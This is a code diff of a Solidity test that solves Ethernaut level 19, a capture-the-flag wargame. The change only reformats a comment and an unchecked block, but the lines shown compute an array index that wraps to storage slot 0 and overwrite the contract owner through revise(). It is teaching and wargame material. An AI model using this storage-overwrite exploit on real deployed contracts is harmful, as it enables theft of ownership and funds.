@@ -21,13 +21,13 @@ contract Level19Test is EthernautTest {
         // We can now calculate the point in the array which will overwrite slot 0
         // Slot 0 is where the owner storage variable is
         uint256 element;
-        unchecked { // First element of array is slot one, subtract that from max, increment one to get slot 0
-        element = type(uint256).max - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1;
+        unchecked {
+            // First element of array is slot one, subtract that from max, increment one to get slot 0
+            element = type(uint256).max - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1;
         }
         // Then we can revise that element to overwrite the owner
         level19Instance.revise(element, bytes32(uint256(uint160(address(this)))));
 
         require(_submitLevel("19"));
     }
-
 }
